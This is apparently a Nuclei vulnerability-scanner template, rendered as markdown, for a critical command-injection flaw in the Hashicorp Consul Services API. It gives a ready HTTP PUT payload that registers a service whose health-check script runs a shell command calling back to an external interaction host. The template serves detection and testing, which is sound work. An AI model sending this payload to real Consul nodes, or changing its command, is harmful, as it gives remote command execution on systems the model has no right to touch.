# Nuclei Template: Hashicorp Consul Services API - Remote Code Execution
**Template ID:** hashicorp-consul-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`hashicorp-consul-rce.yaml`)

## Vulnerability Information & PoC

## Description
Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to perform remote command execution on Consul nodes.

## Steps to reproduce / Exploit Payload
```http
PUT /v1/agent/service/register HTTP/1.1
Host: {{Hostname}}

{
  "ID": "{{randstr}}",
  "Name": "{{randstr}}",
  "Address": "127.0.0.1",
  "Port": 80,
  "check": {
    "script": "nslookup {{interactsh-url}}",
    "interval": "10s",
    "Timeout": "86400s"
  }
}
```

## References
- https://www.exploit-db.com/exploits/46074
